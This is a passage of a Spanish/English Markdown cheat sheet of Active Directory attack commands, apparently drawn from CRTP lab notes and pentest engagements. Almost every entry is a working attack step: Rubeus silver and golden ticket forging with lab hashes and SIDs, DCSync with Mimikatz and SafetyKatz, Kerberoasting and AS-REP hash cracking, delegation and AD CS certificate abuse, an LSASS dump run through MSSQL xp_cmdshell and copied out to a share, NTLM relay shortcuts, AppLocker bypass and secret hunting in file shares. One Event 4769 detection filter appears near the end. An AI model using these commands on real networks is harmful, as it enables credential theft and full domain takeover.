C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### WMI Service - Create two tickets: HOST and RPCSS. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### WMI Service - Create two tickets: HOST and RPCSS. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### Modulo AD/Get-Acl: misma idea, pero sin ResolveGUIDs bonito.
```bash
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

#### Ejecuta DCSync desde PowerShell.
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

#### Ejecuta DCSync con SafetyKatz.
```bash
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### Enumera cuentas con SPN usando ActiveDirectory module.
```bash
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Enumera cuentas con SPN usando PowerView.
```bash
Get-DomainUser -SPN
```

#### Pide TGS para una cuenta concreta.
```bash
Rubeus.exe kerberoast /user:svcadmin /simple
```

#### Roast con rc4opsec sobre cuenta concreta.
```bash
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

#### Enumera usuarios con preauth deshabilitada usando PowerView.
```bash
Get-DomainUser -PreauthNotRequired -Verbose
```

#### Enumera con ActiveDirectory module.
```bash
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### Comprueba SPN existente con PowerView.
```bash
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

#### Comprueba SPN existente con ActiveDirectory module.
```bash
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

#### Asigna SPN unico con PowerView.
```bash
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp/whatever1'}
```

#### Asigna SPN con ActiveDirectory module.
```bash
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp/whatever1'}
```

#### Cracking offline.
```bash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

#### Descubre usuarios con unconstrained delegation.
```bash
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

#### Usar `appadmin` y encontrar acceso local admin - Run from an elevated command prompt. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f0871561e4d0790e71b1245bf20b023d8822d2f85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Usar `appadmin` y encontrar acceso local admin - Run in the new process. Encuentra equipos donde el usuario tiene admin local via PSRemoting.
```bash
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

#### Ejecutar Rubeus en `dcorp-appsrv` - Copy Loader.exe to dcorp-appsrv
```bash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

#### Ejecutar Rubeus en `dcorp-appsrv` - Copy Loader.exe to dcorp-appsrv. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /targetuser:dcorp-dc$ /nowrap
```

#### Escalation to Enterprise Admins - Listen for mcorp-dc$ tickets on dcorp-appsrv. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /targetuser:MCORP-DC$ /nowrap
```

#### Escalation to Enterprise Admins - Run DCSync from this process. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::Evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

#### Enumerar usuarios con Constrained Delegation. Enumeracion PowerView de usuarios o atributos de usuario.
```bash
Get-DomainUser -TrustedToAuth
```

#### Abusar Constrained Delegation con `websvc`. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

#### Abusar Constrained Delegation con `dcorp-adminsrv$` - Run from an elevated shell as SafetyKatz is needed. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb33bff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

#### Abusar RBCD con Rubeus - Abuse the RBCD to access dcorp-mgmt as Domain Administrator. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std481$ /aes256:<STUDENT_MACHINE_AES256> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

#### Extraer trust key - In a new session. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

#### Forge referral ticket. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3b02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

#### Crear e inyectar inter-realm TGT - Already have the krbtgt hash from dcorp-dc. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbc5ba8c3dca848 /netbios:dcorp /ptt
```

#### Forge referral ticket. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:163373571e6c3e09673010fd60accdf0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

#### Solicitar certificado para DA. Enumera o solicita certificados AD CS en el flujo del lab.
```bash
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

#### Solicitar certificado para DA - Use the esc3-DA created above with Rubeus to request a TGT for DA. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
```

#### Escalar a Enterprise Admin. Enumera o solicita certificados AD CS en el flujo del lab.
```bash
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

#### Escalar a Enterprise Admin - Convert the pem to esc3-EA.pfx and use it with Rubeus. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

#### Ejecutar comandos mediante linked database - On the listener
```bash
$env:userdnsdomain
```

#### LSASS dump usando Custom APIs. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'xcopy \\dcorp-std481.dollarcorp.moneycorp.local\studentshare481\mini.ps1 C:\Users\Public'" -QueryTarget eu-sql32
```

#### LSASS dump usando Custom APIs - Make sure minidumpdotnet.dll is hosted on HFS so it can be downloaded to eu-sqlx. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell C:\Users\Public\mini.ps1'" -QueryTarget eu-sql32
```

#### LSASS dump usando Custom APIs - Copy the .dmp file from eu-sqlX to the student VM. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'xcopy C:\Users\Public\reverse.dmp \\dcorp-std481.dollarcorp.moneycorp.local\studentshare481\'" -QueryTarget eu-sql32
```

#### Using PSRemoting
```bash
$env:username
```

#### Detalle de un trust concreto. Mira Direction para saber desde donde hay acceso a recursos.
```bash
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
```

#### Revisa configuracion WSMan. PSRemoting soporta transcriptions y deep script block logging; entiende telemetria.
```bash
Get-Item WSMan:\localhost\Client\TrustedHosts
```

#### Forge referral ticket - Copy the base64 encoded ticket from above and use it
```bash
winrs -r:mcorp-dc.moneycorp.local cmd
```

#### Extraer trust key - In a new process
```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1
```

#### Forge referral ticket - Copy the base64 encoded ticket from above and use it
```bash
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp
```

#### Forge referral ticket - Copy the base64 encoded ticket from above and use it
```bash
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```

#### GPOs aplicadas a un equipo concreto. Une GPO con impacto real sobre una maquina.
```bash
Get-DomainGPO -ComputerIdentity dcorp-student1
```

#### Enumera GPO y su gPCFileSysPath. El path de la plantilla vive normalmente en SYSVOL.
```bash
Get-DomainGPO -Identity 'Target GPO' | Select-Object displayname,name,gpcfilesyspath
```

#### En lab puede forzar aplicacion de politica. En real, es ruidoso y cambia estado; documenta alcance.
```bash
gpupdate /force
```

#### La tecnica apunta a modificar gPCFileSysPath para cargar una plantilla desde una ubicacion controlada. Revisa valor actual antes de cualquier cambio.
```bash
Get-DomainGPO -Identity 'Target GPO' | Select-Object displayname,gpcfilesyspath
```

#### GPO abuse for admin access on `dcorp-ci` - Create a shortcut that connects to the ntlmrelayx listener
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.1' -UseDefaultCredentials"
```

#### GPO abuse for admin access on `dcorp-ci` - Copy the lnk file to dcorp-ci\AI
```bash
xcopy C:\AD\Tools\student701.lnk \\dcorp-ci\AI
```

#### GPODitty template - Run the GPODitty command to create the new template
```bash
cd /mnt/c/AD/Tools/GPODitty
```

#### GPODitty template - On another WSL session
```bash
mkdir /mnt/c/AD/Tools/std701-gp
```

#### GPODitty template - Create a share and allow Everyone full permission on the stdx-gp share
```bash
net share std701-gp=C:\AD\Tools\std701-gp
```

#### GPODitty template - Verify if the gPCFileSysPath. Enumera o resuelve GPOs aplicables.
```bash
Get-DomainGPO -Identity 'DevOps Policy'
```

#### Local admin access y AppLocker - Check if AppLocker is configured on dcorp-adminsrv by querying registry keys
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Local admin access y AppLocker - Looks like AppLocker is configured
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

#### Local admin access y AppLocker - Confirm this using PowerShell commands on dcorp-adminsrv
```bash
Enter-PSSession dcorp-adminsrv
```

#### Local admin access y AppLocker - Confirm this using PowerShell commands on dcorp-adminsrv
```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Drop scripts in Program Files - Create Invoke-TheKatEx-keys-stdx.ps1 with the help of lab manual and copy it on dcorp-adminsrv
```bash
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

#### Drop scripts in Program Files - Check if the file has copied on the session
```bash
cd 'C:\Program Files\'
```

#### Drop scripts in Program Files - Check if the file has copied on the session
```bash
ls
```

#### Drop scripts in Program Files - Run the script
```bash
.\Invoke-TheKatEx-keys-stdx.ps1
```

#### Runas con credenciales elevadas
```bash
.\Invoke-TheKatEx-vault-std481.ps1
```

#### Runas con credenciales elevadas - Start a cmd process using runas
```bash
TheKeyUs3rOn@nyMachine!
```

#### Disable AppLocker by modifying GPO - Run the below command in the spawned cmd
```bash
gpmc.msc
```

#### Disable AppLocker by modifying GPO - Copy Loader on the machine and use it to run SafetyKatz
```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.81
```

#### Inventario rapido del endpoint Windows: version, build, hotfixes, dominio y rol del equipo.
```bash
systeminfo
```

#### Enumera interfaces, DNS, gateway, sufijo DNS y direccion IP del equipo inicial.
```bash
ipconfig /all
```

#### Busca clientes, perfiles o configuraciones SAP en el perfil del usuario actual.
```bash
Get-ChildItem "$env:APPDATA\SAP" -Recurse
```

#### Busqueda local de secretos en ficheros de texto y configuracion. Muy util, pero facil de detectar por EDR.
```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.env
```

#### Lista cuentas locales del endpoint.
```bash
net user
```

#### Muestra miembros del grupo local de administradores para detectar admins locales y grupos de dominio anidados.
```bash
net localgroup administrators
```

#### Verifica si un fichero sospechoso tiene cabecera de hive o estructura de registro antes de invertir mas tiempo.
```bash
Format-Hex "D:\personality.bak\profiles\[SID_SYSTEM]" | Select-Object -First 3
```

#### Exporta una hive de registro offline a texto para revisar claves y metadatos sin cargarla en el sistema.
```bash
hivexregedit --export [SID_SYSTEM] "" > hive18.txt
```

#### Extrae un backup comprimido para revisar su contenido offline.
```bash
tar -xzf [BACKUP_F5]
```

#### Busca ficheros shadow dentro de un backup y vuelca su contenido para validar impacto.
```bash
find . -name "shadow" -exec cat {} \;
```

#### Busca secretos o credenciales en ficheros de configuracion dentro de un arbol de backup.
```bash
grep -r "password|secret" . --include="*.conf" -i
```

#### Valida de forma directa unas credenciales contra LDAP sin intentar aun acceso interactivo.
```bash
$cred = New-Object DirectoryServices.DirectoryEntry("LDAP://[DOMINIO]","[DOMINIO]\[GIE_ADMIN_USER]","[GIE_PWD]")
$cred.NativeObject
```

#### Monta shares SMB remotos con unas credenciales explicitas para comprobar acceso real a datos de negocio.
```bash
New-PSDrive -Name G -PSProvider FileSystem -Root \\[GIE_SERVER]\FicherosGIE -Credential $cred
New-PSDrive -Name L -PSProvider FileSystem -Root \\[GIE_SERVER]\logs -Credential $cred
New-PSDrive -Name P -PSProvider FileSystem -Root \\[GIE_SERVER]\Procesos -Credential $cred
```

#### Enumera usuarios locales del servidor via proveedor WinNT de ADSI.
```bash
$computer = [ADSI]"WinNT://[GIE_SERVER]"
$computer.Children | Where-Object { $_.SchemaClassName -eq "User" }
```

#### Lista shares publicados por un servidor usando solo utilidades nativas de Windows. Buen primer paso antes de montar recursos.
```bash
net view \\SERVIDOR /all
```

#### Busca secretos en shares SMB recurriendo por extensiones de configuracion y scripts. Muy util para descubrir credenciales recicladas.
```bash
Get-ChildItem \\SERVIDOR\SHARE -Recurse -Include *.xml,*.config,*.ini,*.txt,*.ps1 | Select-String -Pattern 'password|passwd|pwd|secret|credential|key' -CaseSensitive:$false
```

#### Limpia sesiones SMB previas para evitar conflictos de autenticacion cuando cambias de usuario contra el mismo servidor.
```bash
net use * /delete /yes
```

---

## 02 — LDAP Querying & Domain User Profiling

#### Snippet basico de LDAP con DirectorySearcher para enumerar usuarios del dominio y guardar resultados a disco.
```bash
$searcher.Filter = "(objectCategory=person)"
$searcher.PageSize = 1000
$searcher.FindAll() | Out-File C:\temp\usuarios_ext.txt
```

#### Enumera todos los equipos del dominio via LDAP y guarda la salida para analisis posterior.
```bash
$searcher.Filter = "(objectCategory=computer)"
$searcher.FindAll() | Out-File C:\temp\equipos.txt
```

#### Filtra objetos equipo cuyo sistema operativo parece servidor para separar rapidamente servidores de estaciones.
```bash
$searcher.Filter = "(&(objectCategory=computer)(operatingsystem=*server*))"
$searcher.FindAll() | Out-File C:\temp\servidores.txt
```

#### Enumera grupos del dominio para revisar seguridad, delegacion y grupos privilegiados.
```bash
$searcher.Filter = "(objectCategory=group)"
$searcher.FindAll() | Out-File grupos.txt
```

#### Saca un listado de OUs para entender estructura logica y segmentacion administrativa.
```bash
$searcher.Filter = "(objectCategory=organizationalUnit)"
$searcher.FindAll() | Out-File ous.txt
```

#### Busca cuentas con SPN configurado, utiles para analisis de servicios y posibles rutas de Kerberoast.
```bash
$searcher.Filter = "(&(objectCategory=person)(servicePrincipalName=*))"
$searcher.FindAll() | Out-File spns.txt
```

#### Lee politica de contrasenas y bloqueo del dominio sin RSAT, solo con ADSI y LDAP.
```bash
$domain = [ADSI]"LDAP://DC=[DC],DC=[EXT]"
$domain | Select minPwdLength,lockoutThreshold,pwdHistoryLength
```

#### Enumera GPOs en LDAP y valida acceso a SYSVOL para revisar scripts, XML y politicas.
```bash
$searcher.Filter = "(objectClass=groupPolicyContainer)"
Get-ChildItem "\\[DOMINIO]\SYSVOL\[DOMINIO]\Policies\"
```

#### Enumera correo principal y aliases SMTP de usuarios del dominio.
```bash
$searcher.PropertiesToLoad.AddRange(@("samaccountname","mail","proxyaddresses"))
$searcher.FindAll() | Out-File usuarios_correos.txt
```

#### Inicializa una sesion LDAP nativa con el contexto Windows actual. Es el punto de partida cuando el host ya esta unido al dominio.
```bash
$gc = New-Object DirectoryServices.DirectoryEntry('LDAP://dominio.local')
$searcher = New-Object DirectoryServices.DirectorySearcher($gc)
$searcher.PageSize = 1000
```

#### Abre LDAP con credenciales explicitas cuando trabajas desde un host fuera del dominio o con otra identidad.
```bash
$domain = 'dominio.local'
$usuario = 'dominio\usuario'
$password = 'Password123'
$gc = New-Object DirectoryServices.DirectoryEntry("LDAP://$domain", $usuario, $password)
$searcher = New-Object DirectoryServices.DirectorySearcher($gc)
$searcher.PageSize = 1000
```

#### Fuerza la conexion a un DC concreto por IP o FQDN cuando DNS falla o quieres controlar exactamente que controlador consultas.
```bash
$gc = New-Object DirectoryServices.DirectoryEntry('LDAP://10.0.0.1', $usuario, $password)
$searcher = New-Object DirectoryServices.DirectorySearcher($gc)
```

#### Busca usuarios cuyo samAccountName contiene cadenas tipicas de administracion y devuelve sus grupos para priorizar objetivos.
```bash
$searcher.Filter = '(&(objectCategory=person)(samaccountname=*admin*))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('samaccountname','memberof'))
$searcher.FindAll() | ForEach-Object { "$($_.Properties['samaccountname']) | $($_.Properties['memberof'] -join ' | ')" }
```

#### Revisa descripciones de usuario buscando secretos, contrasenas o pistas operativas que suelen quedar expuestas en AD heredados.
```bash
$searcher.Filter = '(&(objectCategory=person)(description=*))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('samaccountname','description'))
$searcher.FindAll() | ForEach-Object { "$($_.Properties['samaccountname']) | $($_.Properties['description'])" } | Where-Object { $_ -match 'pass|pwd|cred|key|secret' }
```

#### Consulta grupos criticos directamente por ADSI para revisar miembros y rutas de privilegio.
```bash
foreach ($grupo in $gruposCriticos) { [ADSI]"LDAP://$grupo" }
```

#### Filtra cuentas con DONT_REQ_PREAUTH para identificar candidatas a AS-REP roasting.
```bash
$searcher.Filter = "(&(objectCategory=person)(userAccountControl:...:=4194304))"
```

#### Guarda relacion usuario -> memberof para mapear pertenencias a grupos desde LDAP.
```bash
$searcher.PropertiesToLoad.Add("memberof")
$searcher.FindAll() | Out-File usuarios_grupos.txt
```

#### Guarda relacion grupo -> miembros para revisar grupos privilegiados y delegaciones.
```bash
$searcher.PropertiesToLoad.Add("member")
$searcher.FindAll() | Out-File grupos_privilegiados.txt
```

#### Enumera dominios del forest y relaciones de confianza visibles.
```bash
$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$forest.Domains | ForEach-Object { $_.Name }
$forest.GetAllTrustRelationships()
```

#### Usa el Global Catalog para enumerar usuarios de todo el forest desde un unico punto.
```bash
$gc = [ADSI]"GC://[DOMINIO_FOREST]"
$searcher = New-Object DirectoryServices.DirectorySearcher($gc)
$searcher.Filter = "(objectCategory=person)"
$searcher.FindAll() | Out-File todos_usuarios_forest.txt
```

#### Extrae contadores de fallo, bloqueos y flags de cuentas para detectar cuentas sensibles o abandonadas.
```bash
$searcher.PropertiesToLoad.AddRange(@("samaccountname","badPwdCount","lockoutTime","useraccountcontrol"))
$searcher.FindAll() | Out-File estado_cuentas.txt
```

#### Busca cuentas cuyo campo description delata funciones criticas como SSL-VPN.
```bash
$searcher.Filter = "(&(objectCategory=person)(description=*SSL-VPN*))"
$searcher.FindAll() | Out-File cuenta_vpn_admin.txt
```

#### Identifica cuentas activas con PASSWD_NOTREQD, un hallazgo muy util en AD heredados.
```bash
$searcher.Filter = "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.FindAll() | Out-File cuentas_sin_password.txt
```

#### Busca delegacion Kerberos sin restricciones y recoge senales de despliegue de LAPS.
```bash
$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:...:=524288))"
$searcher.PropertiesToLoad.Add("ms-mcs-admpwdexpirationtime")
$searcher.FindAll() | Out-File laps.txt
```

#### Valida membresias y DN de una cuenta LDAP privilegiada encontrada en otra plataforma.
```bash
$searcher.Filter = "(&(objectCategory=person)(samaccountname=[LDAP_ADMIN_PRINT]))"
$searcher.PropertiesToLoad.AddRange(@("memberof","distinguishedname"))
```

#### Enumera cuentas con password no expirado. Son buenas candidatas para spraying, cred stuffing o persistencia.
```bash
$searcher.Filter = '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('samaccountname','description'))
$searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }
```

#### Lista cuentas deshabilitadas para separar ruido de cuentas realmente explotables y detectar cuentas historicas interesantes.
```bash
$searcher.Filter = '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2))'
$searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }
```

#### Recorre los grupos privilegiados clave y lista sus miembros para construir la ruta de privilegio sin depender de BloodHound.
```bash
$grupos = @('Domain Admins','Enterprise Admins','Schema Admins','Administrators','Account Operators','Backup Operators','Print Operators','Server Operators','Group Policy Creator Owners')
foreach ($g in $grupos) {
  $searcher.Filter = "(&(objectCategory=group)(name=$g))"
  $searcher.PropertiesToLoad.Clear()
  $searcher.PropertiesToLoad.AddRange(@('member','name'))
  $res = $searcher.FindAll()
  if ($res.Count -gt 0) {
    "=== $g ==="
    $res[0].Properties['member'] | ForEach-Object { ($_ -split ',')[0] -replace 'CN=','' }
  }
}
```

#### Identifica controladores de dominio directamente por flag LDAP para centrar la enumeracion en los activos mas sensibles.
```bash
$searcher.Filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('name','dnshostname','description'))
$searcher.FindAll() | ForEach-Object { "$($_.Properties['name']) | $($_.Properties['dnshostname'])" }
```

#### Enumera equipos con delegacion Kerberos sin restricciones, un hallazgo muy potente para movimiento lateral y abuso de tickets.
```bash
$searcher.Filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('name','dnshostname','description'))
$searcher.FindAll() | ForEach-Object { "$($_.Properties['name']) | $($_.Properties['description'])" }
```

#### Lista delegacion restringida y los SPN destino permitidos para detectar rutas S4U2Proxy o abuso de servicios.
```bash
$searcher.Filter = '(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('name','msDS-AllowedToDelegateTo'))
$searcher.FindAll() | ForEach-Object { "$($_.Properties['name']) -> $($_.Properties['msds-allowedtodelegateto'])" }
```

#### Enumera cuentas de servicio con SPN y devuelve suficiente contexto para priorizar Kerberoasting con criterio.
```bash
$searcher.Filter = '(&(objectCategory=person)(servicePrincipalName=*)(!samaccountname=krbtgt))'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('samaccountname','servicePrincipalName','description','memberof','pwdLastSet'))
$searcher.FindAll() | ForEach-Object {
  "Usuario: $($_.Properties['samaccountname'])"
  "SPN: $($_.Properties['serviceprincipalname'])"
  "Grupos: $($_.Properties['memberof'] -join ' | ')"
  '---'
}
```

#### Solicita tickets Kerberos de SPN de forma totalmente nativa en Windows. Es muy util cuando no puedes subir Rubeus ni otras herramientas.
```bash
Add-Type -AssemblyName System.IdentityModel
$spns = @('MSSQLSvc/servidor.dominio.local:1433','HTTP/webapp.dominio.local')
foreach ($spn in $spns) {
  try {
    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    $bytes = $ticket.GetRequest()
    $b64 = [Convert]::ToBase64String($bytes)
    "[+] SPN: $spn"
    "[+] TICKET (base64): $b64"
  } catch { "[-] Error en $spn : $_" }
}
```

#### Enumera trusts via LDAP para detectar dominios hijos, relaciones externas y posibles saltos de bosque sin RSAT.
```bash
$searcher.Filter = '(objectClass=trustedDomain)'
$searcher.PropertiesToLoad.Clear()
$searcher.PropertiesToLoad.AddRange(@('name','trustDirection','trustType'))
$searcher.FindAll() | ForEach-Object { "Trust: $($_.Properties['name']) | Direccion: $($_.Properties['trustdirection']) | Tipo: $($_.Properties['trusttype'])" }
```

---

## 03 — Kerberos: AS-REP Roasting (Pre-Authentication Attacks)

#### Crackear hashes Kerberoast con John the Ripper. Alternativa a hashcat.
```bash
john --format=krb5tgs --wordlist=passwords.txt hashes.kerberoast
```

#### Cracking offline.
```bash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

---

## 04 — Kerberos: Service Principal Names (SPN) & Kerberoasting

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
.\Rubeus.exe kerberoast /stats
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
klist
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 |
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
hashcat -m 13100 -a 0 hashes.kerberoast passwords_kerb.txt
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
./tgsrepcrack.py wordlist.txt ticket.kirbi
```

#### Herramienta de explotación de vulnerabilidades en Kerberos
```bash
kerberoast
```

#### Respuesta del servidor de concesión de tickets
```bash
tgs rep
```

#### Filtra eventos 4769 para detectar solicitudes TGS sospechosas compatibles con Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ? { $_.Message.split("`n")[8] -ne "krbtgt" -and $_.Message.split("`n")[8] -ne "*$" -and $_.Message.split("`n")[3] -notlike "*$@*" -and $_.Message.split("`n")[18] -like "*0x0*" -and $_.Message.split("`n")[17] -like "*0x17*" } | Select-Object -ExpandProperty Message
```

#### Command execution
```bash
Kerberoasting
```

#### Command execution
```bash
